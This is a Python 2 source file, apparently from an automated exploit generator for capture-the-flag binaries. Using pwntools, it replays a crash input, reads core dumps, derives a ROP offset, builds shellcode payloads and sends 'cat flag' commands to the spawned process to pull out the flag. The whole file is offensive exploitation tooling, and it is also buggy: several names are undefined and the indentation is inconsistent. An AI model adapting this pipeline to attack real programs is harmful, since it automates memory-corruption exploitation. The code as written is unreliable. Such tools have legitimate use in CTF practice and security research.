import sys
import os
from pwn import *
from state import state
from analyze import analyze

class crash():
	def __init__(self, binary, crash_file):


		self.binary = binary
		self.crash = self.import_crash(crash_file)
		self.info = set()
		self.core_list = []
        	print self.crash
		self.core_dump()
	def import_crash(self,crash_file):
		#self.crash_file = input('Input crash_file name: ')
		f = open(crash_file, 'r')

		r = f.read()
		f.close()
  		return r
		

	def core_dump(self):
		self.core_list = filter(lambda x:"core" in x, os.listdir('.'))
		if self.core_list is not None:
			os.popen('ulimit -c unlimited')
		for core in self.core_list:
			os.unlink(core)
		p = process(self.binary)
		print self.crash
		p.sendline(self.crash)
		sleep(0.5)
		p.close()
	def get_state(self):
		self.core_list = filter(lambda x:"core" in x, os.listdir('.'))
		if len(self.core_list) == 0:

			if self.crash is '':

				log.info('No Crash')

			else:

				log.info('Crash can\'t be used!')
			return None
		s = state(self.binary, self.crash)
		
		self.info =s.getinfo()
		return self.info
	def exp(self):
		flag = []
		self.info = self.get_state()
		#print INFO

		analy = analyze(self.info, self.binary, self.crash)
		lcs = analy.find_lcs()
	
		if lcs == -1:
			sys.exit(0)
		rop_and_index = analy.calc_index()

		shell = shell_craft(binary, crash, rop_and_index, info)
		payload = shell.create_payload()
	
		for i in payload:
			p = process(binary)

			p.sendline(i)
			p.sendline('echo zxcv;cat flag;')
			try:
				p.recvuntil('zxcv\n')
				flag.append(p.recvuntil('}'))
				p.close()
			except:
			
				p.close()
				pass
		return flag







